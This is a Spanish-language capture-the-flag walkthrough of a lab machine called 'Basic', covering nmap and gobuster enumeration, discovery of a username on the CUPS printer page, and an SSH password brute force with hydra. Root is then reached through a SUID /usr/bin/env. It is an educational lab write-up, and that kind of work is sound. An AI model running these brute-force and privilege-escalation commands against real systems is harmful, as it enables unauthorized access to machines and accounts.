# Basic by Zayru5

Skills: Escaneo de Puertos
Descubrimiento de directorios
SSH Ataque de Fuerza Bruta con Hydra
SUID escalada de privilegios

![Basic.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/Basic.png)

# 🧠 **Skills necesarias** 🧠

### 🔍 **1. Reconocimiento y Escaneo de Red**

- Uso de herramientas como `nmap` para descubrir servicios y puertos abiertos.
- Comprensión de parámetros de escaneo agresivo y evasivo.

### 🌐 **2. Enumeración Web**

- Manejo de herramientas como `gobuster` para detectar rutas ocultas.
- Conocimiento básico de HTTP, códigos de estado (200, 403, 404).
- Capacidad para analizar código HTML en busca de pistas (como usuarios).

### 🔑 **3. Ataques de Fuerza Bruta**

- Uso responsable de `hydra` para ataques contra servicios como SSH.
- Conocimiento de diccionarios como `rockyou.txt`.
- Entendimiento de cómo funcionan los servicios de autenticación.

### 🐚 **4. Acceso y Manejo de Shells**

- Uso básico de `ssh` y navegación en terminal Linux.
- Lectura de archivos del sistema (`/etc/passwd`, `.bash_history`, etc.).

### 🛡️ **5. Escalada de Privilegios**

- Conocimiento sobre el bit **SUID** y su uso indebido.
- Identificación de binarios vulnerables como `/usr/bin/env`.
- Comprensión de cómo invocar shells privilegiadas sin perder contexto.

### 📋 **6. Post-Explotación**

- Recolección de información del sistema.
- Enumeración de usuarios, contraseñas, archivos sensibles.
- Técnicas de limpieza y mantenimiento del acceso.

# 🔍 RECONOCIMIENTO 🔎

- Hacemos un escaneo en nuestra red para identificar la maquina objetivo
- Utilizamos arp_scan
    
    ```bash
    sudo arp-scan --localnet
    ```
    

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image.png)

- Identificamos nuestra maquina objetivo con la IP 192.168.11.13

## 🔍 Escaneo con nmap 🔎

```bash
nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 192.168.11.10 -oN Scan
```

Resultados:

```bash
# Nmap 7.95 scan initiated Thu May  1 21:00:23 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sSCV --min-rate 5000 -vvv -n -Pn -oN Scan 192.168.11.13
Nmap scan report for 192.168.11.13
Host is up, received arp-response (0.00071s latency).
Scanned at 2025-05-01 21:00:23 -05 for 10s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP4OvUJ0xKoulS7xOYz1485bm/ZBVN/86xLQvh7Gqa1DmEWz/eHP2C3MJQnqTFPOEh18FULOzj9fiehyzhd6CM7+qBZ/4B9b5RkOx7AL+S3aRIey4qQj7/k72PqMBkyfD2krjNOg7ZZe8z9o0A4VyeDljG6ukVFeN6PEtWWtdmmnVJztgzX0wPWPaO9GM5hITyvpIB/Y/IqueYR+ft2n5ROLLUfjFLezB+zSa6xkDPGiY9qMZBMXA/6oaaD3TV1x6jfTtZi+Aca0scDfOTJUVlSwZYaHrJQSNlKFJhniucqq/zxOnMIHjs/v1YXYCh0jlYDsb5J/NqTzEPMKkbtwn97T5/FQvsWDGJFTtxvCCrInmnUHB+cG8dSRYQZ763QoPxF/feDSNbrKjTv8D1K2EPhf1rBGQGIObgatVHNFclVWfuq7sn4x9olNnbsEogIQ5mbEq0mBlgOW5vowFxUkI60Ond4Dl7H4fkCeiPfngWFrT+6cQoNgA3HRKf6NtQeYs=
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNDNbes4gKOy7nXoXxW1kPwOX/vuxNkae5WSrIFu+ZD8OUIX5OK8e6o7IZDJAxn/ACAJL9Mm+tA44syyemA6C40=
|   256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINItrDSHbBfPB1CJosqklAQXN4/Mt++ocUqbiG861ZSG
80/tcp  open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Test Debian Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.56 (Debian)
631/tcp open  ipp     syn-ack ttl 64 CUPS 2.3
|_http-title: Inicio - CUPS 2.3.3op2
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: CUPS/2.3 IPP/2.1
MAC Address: 00:0C:29:20:E1:A5 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  1 21:00:33 2025 -- 1 IP address (1 host up) scanned in 10.39 seconds

```

### 🔍 **Puertos abiertos y servicios detectados:**

| Puerto | Servicio | Versión | Notas relevantes |
| --- | --- | --- | --- |
| 22 | SSH | OpenSSH 8.4p1 | Acceso remoto. Podría usarse más adelante si encontramos credenciales. |
| 80 | HTTP | Apache 2.4.56 (Debian) | Página por defecto: “It works” → Necesitamos enumerar más a fondo. |
| 631 | IPP/HTTP | CUPS 2.3.3op2 | Sistema de impresión. Tiene interfaz web, y hay un `robots.txt`. Potencial raro. |

## 🔎 Enumeracion del sitio web

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%201.png)

### 🔍 Escaneo con Gobuster

```bash
gobuster dir -u http://192.168.11.13 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -o gobuster.txt
```

### 🧩 **Parámetros clave:**

| Opción | Significado |
| --- | --- |
| `dir` | Modo para buscar directorios y archivos en un sitio web (modo de escaneo web). |
| `-u http://192.168.11.13` | URL objetivo del escaneo. |
| `-w /usr/share/wordlists/dirb/common.txt` | Lista de palabras para probar (común en directorios web). |
| `-t 50` | Número de **hilos** (threads) simultáneos. 50 es rápido, pero asegúrate de no saturar el host. |
| `-x php,html,txt` | Extensiones a probar. Buscará también `archivo.php`, `archivo.html`, `archivo.txt`, etc. |
| `-o gobuster.txt` | Guarda la salida del escaneo en un archivo llamado `gobuster.txt`. |

### 📋 **Resultados importantes de Gobuster:**

### ✅ **Encontrado con acceso permitido (200):**

- `/index.html`: Página por defecto del servidor Apache. Nada nuevo, ya se sabía.

### 🚫 **Archivos o rutas protegidas (403 Forbidden):**

- `.htaccess`, `.htpasswd`, `.hta` en varias extensiones
- `/server-status`: Módulo de Apache que da info del servidor si está mal configurado (no accesible por ahora)

**Importante:** Aunque 403 no nos da acceso, **indica que esos archivos existen**, lo cual puede ser útil si logramos acceso más adelante o si hay alguna mala configuración.

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.13
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10704]
/index.html           (Status: 200) [Size: 10704]
/server-status        (Status: 403) [Size: 278]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```

### ❗ ¿Qué NO se encontró?

- No hay `/admin`, `/login`, `/config`, ni nada con aspecto dinámico
- No hay archivos `.php` visibles accesibles directamente

### 📂 Archivo robots.txt

El archivo `robots.txt` es parte de una convención usada por sitios web para **controlar el comportamiento de los robots o arañas web** (como los de Google, Bing, etc.).

### 🧠 ¿Para qué sirve?

- Limitar indexación por motores de búsqueda
- Ocultar rutas internas (aunque no es seguro)
- Evitar sobrecarga del servidor

---

### 🛡️ Pero **para nosotros como pentesters**…

Es **una mina de oro potencial**.

### ¿Por qué?

- A menudo lista rutas sensibles o privadas que los admins **no quieren que los bots vean**.
- Pero... ¡si está listado ahí, **sabemos que existe**!

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%202.png)

### 🔍 ¿Qué significa?

Esto simplemente le dice a **todos los motores de búsqueda (user-agents)** que **no deben indexar nada en el servidor** CUPS (todo está “Disallow”).

### ⚠️ ¿Hay algo útil?

**No directamente.** No revela rutas ocultas como `/admin`, `/secret`, etc. Solo dice “no mires nada”.

---

### 🔍 Explorar manualmente CUPS (http://192.168.11.13:631)

- **¿Tiene login?**
- **¿Permite ver impresoras, usuarios o subir archivos?**
- **¿Se puede modificar alguna configuración?**

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%203.png)

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%204.png)

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%205.png)

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%206.png)

**⚠️Se encuentra un potencial usuario ⚠️**

### 🧭 Escanear el puerto 631 con `gobuster` (por si hay rutas ocultas):

```bash
gobuster dir -u http://192.168.11.13:631 -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_cups.txt

```

- No se encontraron rutas interesantes, solo robots.txt
- Las rutas encontradas allí son redirecciones al panel de adiministrador de la página o a la página de inicio.

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%207.png)

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%208.png)

# 🎯 INTRUSIÓN 🎯

### 👤 Usuario encontrado: `dimitri`

Aparece en la cola de impresión como propietario de la impresora. Esto **probablemente es un nombre de usuario del sistema** (Linux).

## Fuerza bruta al puerto 22 (SSH)

- Ya se sabe que el puerto **22 (SSH)** está abierto y que se está ejecutando OpenSSH 8.4p1. Ahora se puede probar combinaciones del usuario **dimitri + contraseñas comunes.**
- Se utilizara la herramienta hydra

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.11.13
```

### 🔍 DESGLOSE

| Parte del comando | Significado |
| --- | --- |
| `hydra` | Llama a la herramienta **Hydra**, utilizada para ataques de fuerza bruta. |
| `-l dimitri` | Indica el **nombre de usuario** a probar: `dimitri`. |
| `-P /usr/share/wordlists/rockyou.txt` | Usa la **lista de contraseñas** `rockyou.txt`, ubicada en esa ruta. Hydra probará cada una con el usuario. |
| `ssh://192.168.11.13` | Especifica el **protocolo** (`ssh`) y la **dirección IP** del objetivo. Hydra intentará iniciar sesión vía SSH en `192.168.11.13`. |

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%209.png)

**Hydra (también conocida como THC Hydra) es una herramienta de fuerza bruta rápida y flexible utilizada para probar combinaciones de usuario/contraseña contra servicios remotos.**

### 🔐 ¿Para qué se usa?

Se utiliza en **hacking ético** o pruebas de penetración para:

- Probar inicios de sesión en servicios como:
    - `SSH`
    - `FTP`
    - `HTTP` (formularios)
    - `Telnet`
    - `SMTP`, `POP3`, `IMAP`
    - `RDP`

### ✅ **Credenciales encontradas:**

- **Usuario:** `dimitri`
- **Contraseña:** `mememe`

Con estas credenciales, se puede **iniciar sesión por SSH**

## Acceso al puerto 22 (SSH)

```bash
ssh dimitri@192.168.11.13
```

- Explorar el sistema de archivos.
- Ver qué permisos tiene el usuario.
- Buscar archivos interesantes (`.bash_history`, `.ssh`, `sudo -l`, ).
- Ver si puedes escalar privilegios.

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%2010.png)

## Escalada de privilegios

✅ **Buscar binarios `SUID` (ejecutables con permisos root)**

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 🔍 **Desglose**

| Parte | Función |
| --- | --- |
| `find` | Comando para **buscar archivos** en el sistema. |
| `/` | **Directorio raíz**: busca en todo el sistema. |
| `-perm -4000` | Busca archivos con el **bit SUID** activado (`4000`). Esto significa que se ejecutan con los **permisos del propietario** (usualmente `root`). |
| `-type f` | Solo busca **archivos** (no directorios, enlaces, etc.). |
| `2>/dev/null` | Oculta los **mensajes de error**, como “Permiso denegado”. |

### 🧠 ¿Qué es el bit SUID?

Cuando un archivo tiene el permiso `SUID`, **si un usuario lo ejecuta, el proceso se ejecuta con los permisos del propietario del archivo**, no con los del usuario que lo ejecuta.

> Por ejemplo, si un archivo es propiedad de root y tiene SUID, cualquier usuario que lo ejecute correrá el proceso como root.
> 

### 🔥 ¿Por qué es útil en hacking ético?

- Algunos binarios `SUID` se pueden **explotar para obtener acceso root**.
- Ejemplo típico: si encuentras `/usr/bin/nmap` con SUID, puedes ejecutar una shell interactiva como root con ciertas versiones.

### ✅ Resultados

```bash
/usr/bin/env
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

### 🚀 /usr/bin/env 🚀

Este es interesante porque algunas versiones permiten **escalar directamente a root** si tienen el bit SUID y si se usan con ciertos lenguajes como `python`, `perl`, `bash`, etc.

### ✅ Escalada con `/usr/bin/env`

```bash
/usr/bin/env /bin/bash -p
```

### 🧩 **Desglose por partes**

| Parte | Función |
| --- | --- |
| `/usr/bin/env` | Ejecuta un programa usando el entorno actual. Si tiene **SUID**, puede lanzar otros binarios con privilegios elevados (por ejemplo, como `root`). |
| `/bin/bash` | Es el binario de Bash, una **shell** de comandos. |
| `-p` | Le dice a Bash que **preserve los privilegios efectivos del usuario real**, es decir, si se lanzó como `root`, mantendrá esos privilegios en la shell. |

### 🛠️ ¿Qué intenta hacer?

Este comando intenta lanzar una shell (`bash`) **usando `/usr/bin/env`** y le pide a esa shell que **no baje sus privilegios** si fue lanzada con `root`.

## 🧠 ¿Qué hace `/usr/bin/env`?

`env` ejecuta un comando en un entorno modificado.

```bash
env python
```

Esto ejecuta el intérprete de Python, si está en tu `$PATH`.

---

## 🔥 ¿Por qué es peligroso si tiene SUID de `root`?

Porque si puedes ejecutar `env` **con el bit SUID activado**, puedes hacer que arranque **otro programa (como `/bin/sh`) con privilegios root**.

Por ejemplo:

```bash
/usr/bin/env /bin/sh -p
```

Si `/usr/bin/env` tiene SUID y es propiedad de `root`, al lanzar `/bin/sh`, este se ejecuta como **root**, no como tu usuario.

## 🔥ROOT🔥

![image.png](Basic%20by%20Zayru5%201e1cb9b1e60b80649a7bdd50d2643e92/image%2011.png)

# ✅CONCLUSIÓN✅

## 🧪 **Resumen de Actividades** 🧪

### 🖥️ 1. **Reconocimiento y Escaneo Inicial**

- Escaneo con `nmap`:
    
    ```bash
    nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 192.168.11.13 -oN Scan
    ```
    
- Se encontraron 3 puertos abiertos:
    - **22 (SSH)** – OpenSSH 8.4p1
    - **80 (HTTP)** – Apache 2.4.56 (Debian)
    - **631 (IPP)** – CUPS 2.3 (interfaz web de impresión)

---

### 🌐 2. **Enumeración Web**

- Uso de `gobuster` para detectar rutas ocultas:
    
    ```bash
    gobuster dir -u http://192.168.11.13 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -o gobuster.txt
    ```
    
- Resultado relevante:
    - Se descubrió la existencia de `/index.html.`
    - Se revisó  la interfaz de CUPS en la ruta http://192.168.11.13 :631, sin encontrar configuraciones útiles.
        - En la ruta [http://192.168.11.13:631/printers](http://192.168.11.13:631/printers) se encontró al usuario dimitri.

---

### 🔐 3. **Ataque de Fuerza Bruta (Brute Force)**

- Se uso `hydra` para atacar el servicio SSH:
    
    ```bash
    hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.11.13
    ```
    
- Credenciales válidas:
    - **Usuario**: `dimitri`
    - **Contraseña**: `mememe`

---

### 🔓 4. **Acceso a la Máquina**

- Se conecta por SSH como el usuario `dimitri`:
    
    ```bash
    ssh dimitri@192.168.11.13
    ```
    

---

### 🛠️ 5. **Escalada de Privilegios**

- Se buscan binarios con el bit SUID:
    
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    ```
    
- Se encontró `/usr/bin/env`, que puede ser explotado si tiene SUID.
- Se ejecutó el siguiente comando de forma exitosa y se obtuvo la shell de root:
    
    ```bash
    /usr/bin/env /bin/bash -p
    ```